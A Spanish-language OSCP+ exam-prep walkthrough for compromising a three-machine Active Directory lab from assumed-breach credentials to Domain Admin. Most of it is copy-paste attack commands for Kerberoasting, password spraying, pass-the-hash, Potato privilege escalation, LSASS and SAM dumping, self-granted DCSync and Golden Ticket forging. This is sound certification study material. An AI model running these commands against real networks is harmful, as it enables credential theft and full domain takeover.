# AD Walkthrough — el set de 3 máquinas, de cero a Domain Admin

Guía **secuencial** para el set de Active Directory del OSCP+: qué hacer, en qué orden, y **cómo
decidir** en cada bifurcación.

- Este documento es el **recorrido**. La referencia por fases está en [`05-active-directory.md`](../05-active-directory.md).
- Cada vez que pisás un Windows, aplicás [`LPE-Windows.md`](../lpe/LPE-Windows.md).
- Comandos sueltos: [`05 — atajos`](../05-active-directory.md#trucos-atajos-y-comandos-copy-paste),
  [`../cheatsheets/nxc.md`](../../cheatsheets/nxc.md), [`../cheatsheets/impacket.md`](../../cheatsheets/impacket.md).

> **Alcance del examen**: **el relay NTLM SÍ entra** (`ntlmrelayx`); los **certificados/ADCS no**.
> **PROHIBIDO**: la **coerción** (PetitPotam/PrinterBug…) y el **poisoning/spoofing**
> (Responder sin `-A`, Inveigh). Responder solo con `-A` (análisis).

---

## El modelo del set

| Máquina | Puntos | Rol habitual |
| --- | --- | --- |
| #1 | 10 | servidor miembro (a veces el primer foothold) |
| #2 | 10 | segundo miembro (a veces salto intermedio) |
| #3 | **20** | **Domain Controller** |

- **Assumed breach**: te dan **usuario y contraseña** de un usuario de dominio (a veces de bajo
  privilegio).
- Los puntos **se cobran por partes**: quedate con los 20 de las dos primeras aunque no llegues al DC.
- **La mayoría de las veces hay que hacer LPE en cada Windows** para poder dumpear credenciales y
  seguir.

### Idea fuerza

```text
credenciales iniciales
   → enumerar el dominio
      → conseguir un foothold en una máquina
         → LPE (SYSTEM/admin local)
            → dumpear credenciales (local + dominio)
               → repetir en la siguiente máquina
                  → DA en el DC
                     → DCSync → fin
```

---

## Tiempo objetivo

| Bloque | Duración | Foco |
| --- | --- | --- |
| 0. Preparación | 5–10 min | variables, DNS, reloj, evidencias |
| 1. Enumeración del dominio | 30–45 min | BloodHound + nxc, sin tocar máquinas aún |
| 2. Ataques de credenciales | 30–60 min | Kerberoast / AS-REP / spray / GPP / LAPS / gMSA |
| 3. Foothold #1 | 20–40 min | creds / PtH / servicio vulnerable |
| 4. **LPE #1** | 30–60 min | SYSTEM + dump de creds |
| 5. Movimiento lateral | 30–60 min | PtH/PtT a la #2 |
| 6. **LPE #2** | 30–60 min | SYSTEM + creds de dominio |
| 7. DC → DA | 20–40 min | DCSync / NTDS / Golden |
| 8. Cierre | 15 min | flags, capturas, evidencia |

> Ajustá según lo que encuentres. La regla de las **1 h 30 min** sigue valiendo: si te trabás,
> cambiá de máquina y volvé.

---

## Bloque 0 — Preparación (5–10 min)

```bash
export DOMAIN='dominio.local'
export REALM='DOMINIO.LOCAL'
export DC_IP='10.10.10.10'
export USER='usuario'
export PASS='password'
export DC_HOST="dc.$DOMAIN"

# /etc/hosts + DNS + reloj
echo "$DC_IP  $DOMAIN $DC_HOST" | sudo tee -a /etc/hosts
sudo ntpdate "$DC_IP" 2>/dev/null || sudo rdate -n "$DC_IP"

# Evidencia desde el minuto cero
mkdir -p ~/examen/evidencia/ad
script -a ~/examen/evidencia/ad/sesion.log
```

**Checkpoint**: `ping $DC_IP` y `nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN"` responden.

> Si Kerberos falla luego, casi siempre es **DNS o reloj**. Revisá `Entorno.md`.

---

## Bloque 1 — Enumeración del dominio (sin tocar máquinas)

### 1.1 Validar credenciales y quién sos

```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --groups --loggedon-users
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol
```

### 1.2 BloodHound — es tu plan

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c all --zip
# o
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --bloodhound --collection All --dns-server "$DC_IP"
```

En BloodHound: marcá tu usuario como **Owned** y corré
**`Shortest Paths from Owned Principals`**. Ese camino, si existe, **es el plan**.

Otras consultas clave:

```text
Find All Paths from Kerberoastable Users
Find Principals with DCSync Rights
Shortest Paths to Domain Admins
Find Computers where Domain Users are Local Admin
```

### 1.3 Recolectar lo accionable

```bash
# Cuentas con SPN (kerberoastables) y sin preauth (AS-REP)
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --kerberoasting kerb.txt
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --asreproast asrep.txt
# Contraseñas pegadas
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --query "(description=*)" "sAMAccountName description"
# Delegación, gMSA, adminCount, lista de equipos
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --find-delegation
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --gmsa
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --admin-count
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --computers
```

### 1.4 Decisión: ¿por dónde entro?

| Lo que ves en BloodHound / enum | Camino a seguir |
| --- | --- |
| Camino corto desde Owned a un grupo/equipo | **Seguilo** (ACLs, delegación) |
| Usuarios kerberoastables con hash débil | **Bloque 2** (crackear) |
| `GenericWrite`/`GenericAll`/`WriteDacl` en algún objeto | **Abuso de ACLs** (en `05`) |
| Hosts donde `Domain Users` es admin local | **PtH/ejecución** directo (Bloque 5) |
| Una app web / MSSQL / servicio raro | **Foothold por vulnerabilidad** (Bloque 3) |
| Sin nada claro todavía | Crackear lo del Bloque 2 y reintentar |

**Checkpoint**: tenés anotados (a) las 3 máquinas relevantes, (b) al menos una credencial/hash
candidata, (c) una hipótesis de primer foothold.

---

## Bloque 2 — Ataques de credenciales (30–60 min)

Corré esto **antes** de romper máquinas: a veces el set se resuelve entero con credenciales.

```bash
# 1) Kerberoast
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 2) AS-REP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 3) GPP (cpassword)
nxc smb "$DC_HOST" -u "$USER" -p "$PASS" -d "$DOMAIN" -M gpp_password
nxc smb "$DC_HOST" -u "$USER" -p "$PASS" -d "$DOMAIN" -M gpp_autologin

# 4) LAPS (password del admin local de un equipo)
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --module laps

# 5) gMSA
python3 gMSADumper.py -u "$USER" -p "$PASS" -d "$DOMAIN"
```

```bash
# 6) Password spraying (LEER --pass-pol ANTES; una contraseña a muchos usuarios)
nxc smb "$DC_IP" -u users.txt -p 'Empresa2026!' -d "$DOMAIN" --continue-on-success
```

**Nueva credencial/hash → probala en todos lados:**

```bash
nxc smb   10.10.10.0/24 -u "$NEWUSER" -p "$NEWPASS" -d "$DOMAIN" --continue-on-success
nxc winrm 10.10.10.0/24 -u "$NEWUSER" -p "$NEWPASS" -d "$DOMAIN" --continue-on-success
```

**Checkpoint**: ¿conseguiste creds de un admin local, o directamente de un DA?
- **Si tenés un DA** → saltá al **Bloque 7** (DCSync) y cerraste el set.
- **Si no** → seguí.

---

## Bloque 3 — Foothold en la primera máquina

### Ruta A — Tenés credenciales válidas en un host

```bash
# Probá en orden; quedate con la shell más cómoda
nxc winrm "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" -x 'whoami'      # si está 5985
evil-winrm -i "$TARGET" -u "$USER" -p "$PASS"
nxc smb   "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" -x 'whoami'
wmiexec.py "$DOMAIN/$USER:$PASS@$TARGET"
```

### Ruta B — Tenés el hash (Pass-the-Hash)

```bash
evil-winrm -i "$TARGET" -u "$USER" -H "$NTHASH"
psexec.py -hashes :"$NTHASH" "$DOMAIN/$USER@$TARGET"
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" -x 'whoami'
```

### Ruta C — No tenés credenciales para ese host: buscá una vulnerabilidad

- **Web** (80/443): `02-enumeracion-servicios.md` → vhosts, LFI/RCE, file upload.
- **MSSQL** (1433): `../cheatsheets/mssql-injection.md` (xp_cmdshell, IMPERSONATE, links).
- **Servicios raros**: `searchsploit`, versiones exactas.
- **SMB**: shares con backups/configs (`nxc smb --spider`, `smbclient`).

> **Si el foothold fue un servicio web o MSSQL**: probablemente el service account tenga
> **`SeImpersonatePrivilege`** → el LPE del Bloque 4 es casi directo.

**Checkpoint**: tenés una shell interactiva (no webshell) en la máquina #1.
Sacá ya la captura de `local.txt` cuando puedas leerla con `cat`/`type` (ver `08-reporte-y-evidencia.md`).

---

## Bloque 4 — **LPE en la máquina #1** (SYSTEM)

> Acá entra [`LPE-Windows.md`](../lpe/LPE-Windows.md). Resumen operativo:

### 4.1 Los 10 segundos que definen todo

```cmd
whoami /all
whoami /priv
```

### 4.2 Si tenés `SeImpersonatePrivilege` (lo más común)

```cmd
potato_check64.exe          :: dice qué Potato aplica en ESTA máquina
GodPotato.exe -cmd "cmd /c whoami"
:: o PrintSpoofer64.exe -i -c cmd
```

Si el token está restringido y falta el privilegio: `FullPowers.exe -c "cmd /c whoami /priv" -z`.

### 4.3 Si no, seguí el orden de `LPE-Windows`

```text
procesos root desde dir escribible → servicios (unquoted/binario escribible)
→ tareas programadas (schtasks, script escribible) → autoruns/registro
→ credenciales guardadas (cmdkey, unattend, GPP, web.config) → AlwaysInstallElevated
→ SeBackup/SeDebug → UAC bypass (si ya sos admin local) → kernel
```

**Atajos clave:**

```cmd
:: Servicios
wmic service get name,pathname | findstr /i /v "\""
accesschk.exe -uwcqv "Users" *
:: Tareas programadas (sacar las de Microsoft)
powershell -c "Get-ScheduledTask | ? {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State"
:: Procesos que corren como SYSTEM desde directorios escribibles
powershell -c "Get-CimInstance Win32_Process | select Name,ProcessId,CommandLine | fl"
```

### 4.4 Una vez SYSTEM/Administrator: **harvest de credenciales**

Esto es lo que hace avanzar el set.

```cmd
:: Credenciales locales
nxc smb "$TARGET" -u Administrator -p "$PASS" -d "$DOMAIN" --sam --lsa
:: o en el host:
reg save HKLM\SAM C:\Temp\SAM & reg save HKLM\SYSTEM C:\Temp\SYSTEM
:: LSASS
procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

```bash
# En tu Kali
secretsdump.py "$DOMAIN/$USER:$PASS@$TARGET"
pypykatz lsa minidump lsass.dmp
```

```cmd
:: Credenciales de DOMINIO de usuarios logueados / guardadas
cmdkey /list
runas /savecred /user:<DOMINIO>\<USER> "cmd /c whoami"
dir /s /b C:\ | findstr /i "unattend.xml web.config .kdbx id_rsa"
```

**Checkpoint**: tenés (a) admin local en la #1, (b) hashes/credenciales nuevas para probar en otras
máquinas. Documentá el flag (`proof.txt`) con captura + IP.

---

## Bloque 5 — Movimiento lateral a la máquina #2

```bash
# ¿Qué credencial nueva funciona dónde?
nxc smb   10.10.10.0/24 -u "$NEWUSER" -p "$NEWPASS" -d "$DOMAIN" --continue-on-success
nxc smb   10.10.10.0/24 -u "$NEWUSER" -H "$NEWHASH"   -d "$DOMAIN" --continue-on-success
nxc winrm 10.10.10.0/24 -u "$NEWUSER" -p "$NEWPASS" -d "$DOMAIN"

# ¿Dónde hay sesiones de admin? (objetivo: robar su hash/tique)
nxc smb 10.10.10.0/24 -u "$USER" -p "$PASS" -d "$DOMAIN" --loggedon-users
```

- **Con hash** → Pass-the-Hash (`evil-winrm -H`, `psexec -hashes`).
- **Con tique** (de un dump o de un `getTGT`) → Pass-the-Ticket (`KRB5CCNAME` + `-k -no-pass`).
- **Sin nada** → volvé a BloodHound: ACLs, delegación (RBCD/constrained), targeted Kerberoast.

**Checkpoint**: shell en la #2 (o directamente en el DC si el camino lo permite).

---

## Bloque 6 — **LPE en la máquina #2** y harvest

Repetí el **Bloque 4** en la segunda máquina. Objetivo aquí: conseguir **credenciales de un
Domain Admin** o derechos de **DCSync**.

- Dumpeá SAM/LSA y LSASS de nuevo.
- Buscá en BloodHound quién tiene sesión en la #2.
- Mirá ACLs sobre el dominio/DC desde tu usuario nuevo.
- Si encontrás `GenericAll`/`WriteDacl`/`ForceChangePassword`/`AddMember` → abuso de ACLs (`05`).

```bash
# Otorgarse DCSync si tenés WriteDacl sobre el dominio (¡backup antes!)
dacledit.py -action write -rights DCSync -principal "$USER" -target "$DOMAIN" -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"
```

---

## Bloque 7 — Comprometer el DC → Domain Admin

### 7.1 DCSync (lo más limpio)

```bash
secretsdump.py -just-dc "$DOMAIN/$USER:$PASS@$DC_IP"
# o con hash / tique
secretsdump.py -hashes :"$NTHASH" "$DOMAIN/$USER@$DC_IP" -just-dc-ntlm
export KRB5CCNAME=admin.ccache && secretsdump.py -k -no-pass "$DC_HOST"
```

### 7.2 Alternativa: NTDS.dit directo (si ya sos admin del DC)

```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --ntds
```

### 7.3 Ticket del `krbtgt` → Golden Ticket

> **NUNCA cambies la contraseña del `krbtgt`** (dos cambios rompen el dominio).

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --get-sid
secretsdump.py -just-dc-user krbtgt "$DOMAIN/$USER:$PASS@$DC_IP"
ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <SID> -domain "$DOMAIN" Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass "$DC_HOST"
```

**Checkpoint final**: `proof.txt` del DC leído con `type` en shell interactiva + IP en la captura.

---

## Bloque 8 — Cierre (15 min)

- [ ] Los 3 `local.txt`/`proof.txt` del set, cada uno con su captura **contenido + IP**.
- [ ] Los 3 puntos del set (10/10/20) enviados en el panel.
- [ ] Evidencia en `~/examen/evidencia/ad/` (`script`, tiques, hashes, comandos).
- [ ] ACLs/objetos modificados **restaurados** si hiciste cambios.
- [ ] Nada de IA durante el examen (ver `00-reglas-examen.md`).

---

## Árbol de decisión (resumen)

```text
creds iniciales
│
├─ ¿Camino corto en BloodHound de Owned → DA?
│    SÍ → abuso de ACLs / delegación → DA → DCSync        [atajo, cerraste]
│    NO ↓
├─ Kerberoast / AS-REP / GPP / LAPS / gMSA / spray
│    ¿creds nuevas? ─ SÍ → probarlas en todos lados
│         ¿son de admin local? → ejecutar → LPE → harvest → seguir
│         ¿son de DA? → DCSync                            [cerraste]
│    NO ↓
├─ Foothold en #1 (creds/PtH o vulnerabilidad web/MSSQL/SMB)
│    → LPE (potato_check + LPE-Windows) → SYSTEM
│    → dump SAM/LSA/LSASS + creds de dominio
│    → movimiento lateral a #2 → LPE #2 → harvest
│    → DC → DCSync / NTDS / Golden → DA
│
└─ si nada funciona: volver a enumerar (el 90% de los bloqueos es enum incompleta)
```

---

## Errores típicos en el set

| Error | Por qué duele |
| --- | --- |
| No hacer LPE en cada Windows | sin SYSTEM no podés dumpear credenciales ni avanzar |
| Quemar Metasploit aquí | el set AD suele necesitar varias máquinas; ver `00-reglas-examen.md` |
| No leer `--pass-pol` antes de spraying | bloqueás cuentas del examen |
| Tocar el `krbtgt` | rompés el dominio entero |
| Modificar ACLs/SPNs sin revertir | ensuciás el entorno |
| Perseguir el DC sin cobrar los 10+10 | asegurá puntos parciales primero |
| No documentar los flags al momento | el reporte es final e inapelable |

---

## Chuletas relacionadas

- [`05-active-directory.md`](../05-active-directory.md) — la referencia por fases + atajos
- [`Standalone-walkthrough.md`](Standalone-walkthrough.md) — recorrido de las **máquinas sueltas**
- [`LPE-Windows.md`](../lpe/LPE-Windows.md) — el LPE de cada máquina
- [`../cheatsheets/potatoes.md`](../../cheatsheets/potatoes.md) · [`../cheatsheets/mssql-injection.md`](../../cheatsheets/mssql-injection.md)
- [`../cheatsheets/nxc.md`](../../cheatsheets/nxc.md) · [`../cheatsheets/impacket.md`](../../cheatsheets/impacket.md)
- [`07-pivoting.md`](../07-pivoting.md) · [`08-reporte-y-evidencia.md`](../08-reporte-y-evidencia.md)
